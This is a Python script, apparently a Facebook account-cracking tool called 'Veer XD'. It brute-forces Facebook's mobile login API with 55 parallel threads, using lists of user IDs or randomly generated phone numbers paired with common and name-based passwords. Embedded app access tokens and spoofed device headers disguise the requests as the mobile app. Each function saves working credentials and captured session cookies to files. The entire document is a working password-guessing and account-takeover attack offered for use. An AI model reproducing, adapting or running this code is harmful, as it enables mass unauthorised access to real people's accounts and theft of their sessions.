import os
import sys
import time
import uuid
import json
import string
import random
import requests
from bs4 import BeautifulSoup as sop
from requests.exceptions import ConnectionError as errorN
from concurrent.futures import ThreadPoolExecutor as speedX

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
okacc = []
cpacc = []

devices = ["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"]

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}{ 50 * '═' }")

def x():
    os.system("xdg-open https://www.facebook.com/profile.php?id=100014130016963")

def main():
    x()
    logo()
    print(f" {w}[1] {r}File Cloning ")
    print(f" {w}[2] {r}Random Cloning ")
    print(f" {w}[3] {r}Contact Author ")
    print(f" {w}[4] {r}Exit Veer Tool ")
    linex()
    veer_xd = input(f" {w}[?] Select Option : ")
    if veer_xd == "1":
        file_crack()
    elif veer_xd == "2":
        random_crack()
    elif veer_xd == "3":
        os.system("xdg-open https://wa.me/+923193253663")
        main()
    elif veer_xd == "4":
        linex()
        print(f" {w}[!] {r}Thanks for using tool ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {w}[!] {r}Selected option is invalid ")
        linex()
        time.sleep(1)
        main()

def file_crack():
    logo()
    note = "Use new series file for best results"
    file_ex = "/sdcard/file.txt"
    print(f" {w}[•] Note : {r}{note} ")
    linex()
    print(f" {w}[•] Example : {r}{file_ex} ")
    linex()
    file = input(f" {w}[?] Put File Path : ")
    try:
        idz = open(file, "r").read().splitlines()
    except FileNotFoundError:
        linex()
        x = "File not found in storage"
        print(f" {w}[!] {r}{x} ")
        linex()
        time.sleep(1)
        file_crack()
    logo()
    print(f" {w}[1] {r}Method 1 ")
    print(f" {w}[2] {r}Method 2 ")
    print(f" {w}[3] {r}Method 3 ")
    linex()
    method = input(f" {w}[?] Select Option : ")
    logo()
    print(f" {w}[1] {r}Crack With Auto Pass ")
    print(f" {w}[2] {r}Crack With Manual Pass ")
    linex()
    ptype = input(f" {w}[?] Select Option : ")
    ps_list = []
    if ptype == "1":
        ps_list.append("first123")
        ps_list.append("first1234")
        ps_list.append("first1235")
        ps_list.append("firstlast")
        ps_list.append("first last")
    else:
        logo()
        print(f" {w}[•] {r}Maximum password limit is 10 ")
        linex()
        try:
            ps_limit = int(input(f" {w}[?] Put Password Limit : "))
        except ValueError:
            ps_limit = 5
        logo()
        ex = "first123, firstlast, firstkhan"
        print(f" {w}[•] Example : {r}{ex} ")
        linex()
        for x in range(ps_limit):
            ask_pw = input(f" {w}[?] Put Password {r}{x+1} {w}: ")
            ps_list.append(ask_pw)
    with speedX(max_workers=55) as file_process:
        logo()
        total_idz = str(len(idz))
        print(f" {w}[√] Total Accounts : {r}{total_idz} ")
        print(f" {w}[√] Brute has been started ")
        print(f" {w}[√] {r}Use flight mode for speed up ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pww = ps_list
            file_process.submit(file_method, uid, name, pww, total_idz)
    linex()
    print(f" {w}[!] {r}Process Completed ")
    print(f" {w}[•] Total OK Accounts : {g}{str(len(okacc))} ")
    print(f" {w}[•] Total CP Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {w}[!] {r}Press enter to back ")
    sys.exit()

def random_crack():
    logo()
    idz = []
    code_ex = "0310, 0320, 0330, 0340"
    limit_ex = "1000, 2000, 5000, 10000"
    print(f" {w}[•] Codes : {g}{code_ex} ")
    print(f" {w}[•] Limit : {g}{limit_ex} ")
    linex()
    code = input(f" {w}[?] Put Code  : ")
    try:
        limit = int(input(f" {w}[?] Put Limit : "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        idz.append("".join(random.choice(string.digits) for _ in range(7)))
    linex()
    print(f" {w}[1] Method 1 ")
    print(f" {w}[2] Method 2 ")
    print(f" {w}[3] Method 3 ")
    linex()
    m = input(f" {w}[?] Select Option : ")
    with speedX(max_workers=55) as random_process:
        logo()
        total_idz = str(len(idz))
        print(f" {w}[√] Total Accounts  : {g}{total_idz} ")
        print(f" {w}[√] Code You Choose : {g}{code} ")
        print(f" {w}[√] {r}Use flight mode for speed up ")
        linex()
        for love in idz:
            uid = code+love
            pww = [love,code+love,"khankhan","khan123","khan1122","khan12345","baloch123","ali12345","ali1122","janjan","kingkhan","malik123","pubgking","pubg123","pubg@786","pakistan","jan@786"]
            if "1" in m:
                random_process.submit(random_method1, uid, pww, total_idz)
            elif "2" in m:
                random_process.submit(random_method2, uid, pww, total_idz)
            elif "3" in m:
                random_process.submit(random_method3, uid, pww, total_idz)
            else:
                random_process.submit(random_method3, uid, pww, total_idz)
    linex()
    print(f" {w}[!] {r}Process Completed ")
    print(f" {w}[•] Total OK Accounts : {g}{str(len(okacc))} ")
    print(f" {w}[•] Total CP Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {w}[!] {r}Press enter to back ")
    sys.exit()

def file_method(uid, name, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[VEER-XD] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = "khan"
        for pw in pww:
            ps = pw.replace("first", first).replace("last", last).replace("name", name).lower()
            ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/75.0.0.3975;FBBV/5474136;FBDM/{density=1.5,width=1359,height=1686};FBLC/en_PK;FBRV/919684962;FBCR/Mobilink;FBMF/RMX3784;FBBD/Realme;FBPN/com.facebook.adsmanager;FBDV/RMX3784;FBSV/14;FBOP/1;FBCA/x86:armeabi-v7a;]"
            secure = str(uuid.uuid4())
            data = {
                "adid": secure,
                "format": "json",
                "device_id": secure,
                "cpl": "true",
                "family_device_id": secure,
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": uid,
                "password": pw,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",
                "advertiser_id": secure,
                "currently_logged_in_userid": "0",
                "locale": "en_PK",
                "client_country_code": "PK",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            headers = {
                'User-Agent': ua_string,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': "MOBILE.LTE",
                'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                'X-FB-Connection-Quality':"MOBILE.LTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                print(f" {g}[VEER-OK] {uid} | {ps}")
                open("/sdcard/VEER-FILE-OK.txt", "a").write(f"{uid}|{ps}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                #print(f" {r}[VEER-CP] {uid} | {ps}")
                open("/sdcard/VEER-FILE-CP.txt", "a").write(f"{uid}|{ps}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

def random_method1(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[VEER-M1] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[[FBAN/FB4A;FBAV/156.0.0.41.374;FBBV/97376871;FBDM/{density=2.0,width=720,height=1280};FBLC/lv_LV;FBCR/movistar;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo_A5000;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
            secure = str(uuid.uuid4())
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': uid,
                'password': pw,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
            }
            headers = {
                'User-Agent': ua_string,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111,99999)),
                'X-FB-SIM-HNI': str(random.randint(11111,99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': str(random.randint(11111,99999)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[VEER-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {b}{coki} ")
                open("/sdcard/VEER-RANDOM-OK.txt", "a").write(f"{uid}|{pw}\n")
                open("/sdcard/VEER-RANDOM-COKI.txt", "a").write(f"{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
              #  print(f" {r}[VEER-CP] {uid} | {pw}")
                open("/sdcard/VEER-RANDOM-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

def random_method2(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[VEER-M2] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            device = random.choice(devices)
            secure = str(uuid.uuid4())
            ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[[FBAN/FB4A;FBAV/156.0.0.41.374;FBBV/97376871;FBDM/{density=2.0,width=720,height=1280};FBLC/lv_LV;FBCR/movistar;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo_A5000;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
            data = {
                'adid':secure,
                'format':'json',
                'device':device,
                'device_id':secure,
                'email':uid,
                'password':pw,
                "logged_out_id": secure,
                "hash_id": secure,
                "reg_instance": secure,
                "session_id": secure,
                "advertiser_id": secure,
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                "locale":"en_US","client_country_code":"US",
                'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            headers = {
                'Authorization':f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent':ua_string,
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[VEER-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {y}{coki} ")
                open("/sdcard/VEER-RANDOM-OK.txt", "a").write(f"{uid}|{pw}\n")
                open("/sdcard/VEER-RANDOM-COKI.txt", "a").write(f"{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
               # print(f" {r}[VEER-CP] {uid} | {pw}")
                open("/sdcard/VEER-RANDOM-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

def random_method3(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[VEER-M3] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[[FBAN/FB4A;FBAV/156.0.0.41.374;FBBV/97376871;FBDM/{density=2.0,width=720,height=1280};FBLC/lv_LV;FBCR/movistar;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo_A5000;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
            secure = str(uuid.uuid4())
            net_hni = str(random.randint(11111,99999))
            data = {
                'adid': secure,
                'format': 'json',
                'device_id': secure,
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': secure,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
            }
            headers = {
                'User-Agent': ua_string,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': net_hni,
                'X-FB-Net-HNI': net_hni,
                'X-FB-SIM-HNI': net_hni,
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[VEER-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {y}{coki} ")
                open("/sdcard/VEER-RANDOM-OK.txt", "a").write(f"{uid}|{pw}\n")
                open("/sdcard/VEER-RANDOM-COKI.txt", "a").write(f"{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
               # print(f" {r}[VEER-CP] {uid} | {pw}")
                open("/sdcard/VEER-RANDOM-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

banner = f"""
        {w}db    db d88888b d88888b d8888b.
        {w}88    88 88'     88'     88  `8D
        {r}Y8    8P 88ooooo 88ooooo 88oobY'
        {r}`8b  d8' 88~~~~~ 88~~~~~ 88`8b    {g}K
        {w} `8bd8'  88.     88.     88 `88.  {g}K
        {w}   YP    Y88888P Y88888P 88   YD  {g}C
       {w}╔══════════════════════════════════╗
       {w}║ => Author  : Veer Ali            ║  {r}
       {w}║ => Github  : Veer-404            ║  {g}
       {w}║ => Team    : KXV                 ║  {g}
       {w}║ => Whatsapp: +923193253663       ║  {g}
       {w}║ => Version : 0.1                 ║  {y}
       {w}╚══════════════════════════════════╝\n{w}{ 50 * '═' }"""

if __name__ == "__main__":
    main()